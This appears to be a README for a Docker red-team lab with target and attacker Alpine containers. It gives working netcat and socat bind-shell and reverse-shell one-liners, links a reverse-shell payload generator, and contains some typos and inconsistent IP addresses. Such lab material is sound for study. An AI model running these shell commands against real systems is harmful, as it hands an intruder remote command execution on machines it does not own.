
Setup containers using Alpine Linux as target and attacker for red-team exercises.

* The target has an IP address of  `172.24.0.2`.
* The attacker has an IP address of `172.24.0.3`.
* The target and attack have ports 5009 expoed for `tcp` and `udp`.
* Port `5010` is exposed on the target and port `5011` is exposed on attacker to the host. 

The static IP address for the containers can be removed for `nmap` practice.  Install aother tools as needed in the `Dockerfile` for each image.

## Usage

Build and run the containers.  They will stay running in the shell you're using.
```sh
docker-compose up
```

Open a new terminal and setup on `target` container:
```sh
docker exec -it target /bin/bash
```

Open a new terminal and setup on `attacker` container:
```sh
docker exec -it target /bin/bash
```

### Bind Shells
Have the attacker connect to the target.


#### Netcat
Everybody's go-to.  Instructions below are for the neutered `netcat-openbsd` version.

On `target` container interactive bash, connect to the attacker:
```sh
mkfifo f
nc -l -p 5009 0<f | /bin/bash > f 2>&1
```


Find the `attacker` ip address and setup listener:
```sh
nc 172.20.0.2 5009 -vvv
```


#### Socat
Socat is a better option since you can use history and encryption with `tty`.  Target machine is likely going to have netcat installed, but once a shell session is establed, you can install other tools.

[Manual](http://manned.org/nc.openbsd/6f0a5cf9)

Find the `target` ip address and setup listener:
```sh
socat TCP-LISTEN:5009,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```


On `attacker` container interactive bash, connect to the `target`.:
```sh
socat FILE:`tty`,raw,echo=0 TCP4:172.24.0.2:5009
```

Stop connection with `exit` on `attacker`.



### Reverse Shells
Have the target connect to the attacker.  Circumvents inbound firewall rules.

#### Netcat

Find the `attacker` ip address and setup listener:
```sh
nc -lvnp 5009 -vvv
```


On `target` container interactive bash, connect to the attacker:
```sh
rm -f f 2> /dev/null
mkfifo f
cat f | /bin/sh -i 2>&1 | nc 172.20.0.3 5009 > f

OR

nc 172.24.0.3 5009 0<f | /bin/sh -i 2>&1 | tee f
```


#### Socat

Setup listener:
```sh
hostname -i
socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:5009
```


On `target` container interactive bash, connect to the attacker.:
```sh
socat TCP:172.24.0.3:5009 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

Stop connection with `exit` on `attacker`.



## Cleanup

On the docker-compose terminal press `ctrl+c` to stop the running containers.  
```sh
docker-compose down
```


## Debugging


### Docker Compose
```sh
docker-compose --verbose up
```

Show running container IP addresse from host:
```sh
docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container_name>
```

Show IP address from running container:
```sh
hostname -i
```

List running procees:
```sh
ps
```

Kill specified process ID.  You may need to do this for already running listeners.
```sh
kip <pid>
```

If you get `connection refused`, make sure your listener is running.


## Disclaimer

**This is for educational purposes.  **


## Tools
* [Generate reverse shell payloads](https://www.revshells.com/)


## TODO:
* Static IP addresses for containers for ease via `docker-compose.yaml`?